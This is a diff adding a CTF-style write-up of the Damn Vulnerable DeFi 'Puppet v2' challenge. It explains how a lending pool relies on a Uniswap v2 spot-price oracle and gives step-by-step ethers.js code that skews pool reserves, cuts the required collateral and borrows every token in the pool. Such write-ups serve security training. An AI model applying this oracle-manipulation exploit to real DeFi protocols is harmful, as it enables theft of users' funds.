@@ -588,3 +588,85 @@ We can quickly realise that if we make the denominator greater than the numerato
 ### The Hack
 We can use the `tokenToEthSwapInput` to send some tokens to the DEX and receive ETH in return, making the ETH balance in the pool smaller.
 Then we can call the `borrow` function for getting all the tokens of the pool with few collateral.
+
+## Challenge #9: Puppet v2
+### The Goal
+The Puppet v2 challenge states the following:
+> The developers of the last lending pool are saying that they've learned the lesson. And just released a new version! Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.
+
+Our goal is to steal all the tokens from the lending pool, starting with 20ETH and 10000 DVTs in balance.
+
+### Contract Call Graphs
+There is 1 contract and UniswapV2 library:
+- PuppetV2Pool.sol
+- UniswapV2Library.sol
+
+The contract diagram for the Puppet V2 Pool generated with the Solidity Visual Auditor extension is the following:
+
+<figure style="text-align:center;">
+    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/puppetv2.png" title="PuppetV2Pool" width="500"/>
+    <figcaption>Puppet V2 Pool</figcaption>
+</figure>
+
+### Required Knowledge
+- (Uniswap V2)[https://medium.com/@chiqing/uniswap-v2-explained-beginner-friendly-b5d2cb64fe0f#:~:text=Uniswap%20V2%20allows%20traders%20to,is%20called%20%E2%80%9CLiquidity%20Pool%E2%80%9D.]
+
+### Contracts Highlights
+In the lending pool contract we see 3 functions:
+- **borrow(borrowAmount)**: here we can borrow any quantity of DVT tokens as long as there is enough liquidity in the pool and we deposit the required WETH amount as collateral. For calculating the collateral required the contract uses the function below.
+- **calculateDepositOfWETH(tokenAmount)**: here we simply get the quote from the function below and multiply it by 3, as the contract requires that we deposit 3 times the amount in WETH.
+- **_getOracleQuote(amount)**: here we call the `quote` function from Uniswap library. 
+
+In the same way as in the previous challenge, we can observe the formula for getting the quote is:
+```
+               amountTokenA * reserveTokenB           DVTTokenAmount * WETHReserve
+quote =     ---------------------------------   =   ---------------------------------
+                    reserveTokenA                           DVTReserve
+```
+
+
+### The Hack
+The idea is to manipulate the price of the quote, so we can borrow all DVT tokens at discount. For doing so, if we make the denominator greater, we can decrease the quote that the pool contract will receive.
+
+1. We approve the DVT tokens to the Uniswap Router contract
+```
+await this.token.connect(attacker).approve(
+    this.uniswapRouter.address,
+    ATTACKER_INITIAL_TOKEN_BALANCE
+);
+```
+
+2. We swap DVT for ETH to increase the DVT token reserve. This will make the denominater greater than the numerator, resulting in decreasing the quote price
+
+```
+await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+    ATTACKER_INITIAL_TOKEN_BALANCE, //amountIn
+    0, //amountOutMin
+    [this.token.address, this.weth.address], //addresses
+    attacker.address, //to
+    (await ethers.provider.getBlock('latest')).timestamp *2, //deadline
+);
+```
+
+3. Now we can calculate the amount of WETH needed as collateral in order to get all DVT tokens from the lending pool
+```
+const collateral = await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+```
+
+4. We can proceed to wrap ETH to WETH and obtain the required collateral
+```
+ Wrap WETH
+await this.weth.connect(attacker).deposit({
+    value: collateral
+});
+```
+
+5. Now we approve the amount of WETH to the pool, so it can trasnfer our collateral for performing the borrow successfully
+
+```
+await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
+```
+6. Finally, we get all DVT tokens using the borrow function from the pool
+```
+await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+```
